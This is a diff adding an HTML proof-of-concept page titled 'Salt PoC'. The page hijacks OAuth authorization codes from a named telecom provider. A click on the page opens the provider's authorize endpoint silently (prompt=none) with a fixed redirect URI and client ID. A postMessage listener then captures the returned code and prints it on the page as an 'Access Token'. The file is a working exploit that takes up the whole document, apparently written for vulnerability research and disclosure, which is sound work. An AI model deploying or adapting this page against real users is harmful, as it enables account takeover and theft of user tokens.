@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salt PoC</title>
+</head>
+<body>
+    <p>Click here to hijack token!</p>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHlY7jda7OEmJpPl0ga2UpDzFX8iE9OyVWICN1Qtefc0EWL9NqvlpI1gxKL4dTHTAuk_U&usqp=CAU">
+    <script>
+
+    function handleOnClick() {
+      var newTab = window.open('https://oauth2.bouyguestelecom.fr/authorize?tmpl=bytelConnect&prompt=none&redirect_uri=https%3A%2F%2Fassets.bouyguestelecom.fr%2FPICASSO-FRONT%2Fmain%401.0.11%2Fbouyguestelecom.fr%2Fcallback.html&nonce=rAVBESXIGIrtYfU&state=DkDHMqcpb7r55BAP74_init&client_id=tribu.find.bouyguestelecom.fr&code_challenge_method=S256&response_type=code&code_challenge=PVYdz9n6iyJCd5pELWP3ejFGiXh4TUzjWwZvl6a4B94');
+      setTimeout(function() {
+        newTab.close();
+      }, 10000000000);
+}
+    window.addEventListener('message', function(event) {
+    console.log(event.data);
+
+    if (event.data.code) {
+        document.write(`Your Access Token: ${JSON.stringify(event.data)}`);
+    } else {
+        console.error('Error');
+    }
+}, false);
+
+window.onclick = handleOnClick;
+    </script>
+</body>
+</html>
